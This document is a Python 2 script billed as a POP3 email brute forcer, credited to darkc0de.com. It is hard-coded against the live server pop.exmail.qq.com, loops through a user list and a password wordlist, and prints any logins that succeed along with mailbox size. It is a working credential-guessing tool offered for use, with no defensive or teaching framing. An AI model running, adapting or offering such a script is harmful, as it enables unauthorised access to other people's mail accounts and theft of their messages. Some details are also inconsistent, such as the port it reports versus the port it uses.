
#!usr/bin/python
#Email Pop3 Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com
#http://www.nxadmin.com

import threading, time, random, sys, poplib
from copy import copy

if len(sys.argv) !=3:
  print "\n\t   EmailPopBruteForcer v1.0"
  print "\t   --------------------------------------------------\n"
  print "\t    Usage: ./qmailpopbrute.py <userlist> <wordlist>\n"
  sys.exit(1)
  
server = "pop.exmail.qq.com"
success = []

try:
    users = open(sys.argv[1], "r").readlines()
except(IOError):
    print "[-] Error: Check your userlist path\n"
    sys.exit(1)
  
try:
    words = open(sys.argv[2], "r").readlines()
except(IOError):
    print "[-] Error: Check your wordlist path\n"
    sys.exit(1)
  
try:
  pop = poplib.POP3_SSL(server,995)
  welcome = pop.getwelcome()
  print welcome
  pop.quit()
except (poplib.error_proto):
  welcome = "No Response"
  pass

def mailbruteforce(listuser,listpwd):
  if len(listuser) < 1 or len(listpwd) < 1 :
    print "An error occurred: No user or pass list"
    return 1
  for user in listuser:
    for value in listpwd :
      user = user.replace("\n","")
      value = value.replace("\n","")
      
      try:
        print "-"*12
        
        print "[+] User:",user,"Password:",value
        time.sleep(2)
        pop = poplib.POP3(server,110)
        pop.user(user)
        auth = pop.pass_(value)
        print auth
        if auth =="+OK": 
          pop.quit()
          print "unknown error !"
          continue
        if pop.stat()[1] is None or pop.stat()[1] < 1 :
          pop.quit()
          print "unknown error !"
          continue
        #print "\t\t\n\nLogin successful:",user, value
        #print "\t\tMail:",pop.stat()[0],"emails"
        #print "\t\tSize:",pop.stat()[1],"bytes\n\n"
        ret = (user,value,pop.stat()[0],pop.stat()[1])
        success.append(ret)
        #print len(success)
        pop.quit()
        break
      except:
        #print "An error occurred:", msg
        pass



print "\n\t EmailPopBruteForcer v1.0"
print "\t   --------------------------------------------------\n"
print "[+] Server:",server
print "[+] Port: 995"
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+] Server response:",welcome,"\n"
mailbruteforce(users,words)

print "\t[+] have weakpass :\t",len(success)
if len(success) >=1:
  for ret in success:
    print "\n\n[+] Login successful:",ret[0], ret[1]
    print "\t[+] Mail:",ret[2],"emails"
    print "\t[+] Size:",ret[3],"bytes\n"
print "\n[-] Done"
